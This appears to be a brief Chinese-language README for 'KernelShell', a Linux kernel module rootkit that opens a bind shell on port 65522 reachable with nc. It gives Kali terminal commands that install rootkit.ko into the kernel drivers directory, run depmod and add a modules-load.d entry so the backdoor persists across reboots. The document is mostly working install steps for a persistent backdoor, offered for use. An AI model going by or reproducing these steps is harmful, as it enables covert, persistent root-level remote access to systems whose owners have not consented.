# KernelShell

这个模块实现了一个bindShell 端口65522nc连接就可以，安装过程如下，且可以保证重启依旧有效

```
┌──(kali㉿kali)-[~/kernel2]
└─$ sudo cp rootkit.ko /lib/modules/$(uname -r)/kernel/drivers/                           

┌──(kali㉿kali)-[~/kernel2]
└─$ sudo depmod -a
                                               
┌──(kali㉿kali)-[~/kernel2]
└─$ sudo nano /etc/modules-load.d/rootkit.conf #rootkit
                                           
┌──(kali㉿kali)-[~/kernel2]
└─$ 
```
![image.png](https://s2.loli.net/2025/10/08/zLWIxr3XHtUBlM9.png)